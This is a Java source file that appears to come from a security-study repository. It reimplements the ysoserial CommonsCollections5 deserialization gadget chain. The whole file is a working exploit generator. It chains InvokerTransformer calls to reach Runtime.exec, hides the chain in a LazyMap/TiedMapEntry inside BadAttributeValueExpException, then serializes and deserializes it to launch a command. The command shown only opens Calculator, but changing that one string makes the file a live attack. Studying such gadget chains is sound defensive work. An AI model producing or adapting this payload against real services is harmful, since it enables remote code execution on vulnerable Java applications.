package org.su18.serialize.ysoserial.CommonCollections.CommonCollections5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.ysoserial.Utils.SerializeUtil;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @author su18
 */
public class CC5 {

	public static String fileName = "CC5.bin";

	public static void main(String[] args) throws Exception {

		// 创建 ChainedTransformer
		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
				new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
		});

		// 创建 LazyMap 并引入 TiedMapEntry
		Map          lazyMap = LazyMap.decorate(new HashMap(), chain);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, "su18");

		// 实例化 BadAttributeValueExpException 并反射写入
		BadAttributeValueExpException exception = new BadAttributeValueExpException("su18");
		Field                         field     = BadAttributeValueExpException.class.getDeclaredField("val");
		field.setAccessible(true);
		field.set(exception, entry);

		SerializeUtil.writeObjectToFile(exception, fileName);
		SerializeUtil.readFileObject(fileName);
	}
}
